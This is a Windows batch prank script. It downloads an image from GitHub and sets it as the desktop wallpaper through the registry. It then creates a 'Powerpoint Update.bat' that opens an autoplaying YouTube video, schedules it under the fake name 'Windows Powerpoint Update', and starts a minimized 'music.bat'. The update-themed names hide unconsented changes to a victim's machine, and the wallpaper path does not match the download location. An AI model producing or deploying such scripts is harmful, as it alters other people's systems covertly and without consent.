powershell $client = new-object System.Net.WebClient;$client.DownloadFile('https://raw.githubusercontent.com/xiaozhu2007/FuckWYXBatch/master/doge.jpg' , 'C:\Users\Public\Documents\doge.jpg');reg add 'HKCU\Control Panel\Desktop' /v WallPaper /d '%USERPROFILE%\doge.jpg' /f;RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;exit
powershell rm """C:\Users\Public\Documents\Powerpoint Update.bat"""
powershell.exe New-Item -Path 'C:\Users\Public\Documents\Powerpoint Update.bat' -ItemType File; Set-Content -Path 'C:\Users\Public\Documents\Powerpoint Update.bat' -Value 'powershell.exe start https://www.youtube.com/embed/bC_W93NwQ5A?autoplay=1;'
SCHTASKS /Delete /TN "Windows Powerpoint Update" /f
SCHTASKS /Create /TN "Windows Powerpoint Update" /ST 12:20:00 /SC ONCE /TR "C:\Users\Public\Documents\Powerpoint Update.bat"
start /min "music.bat"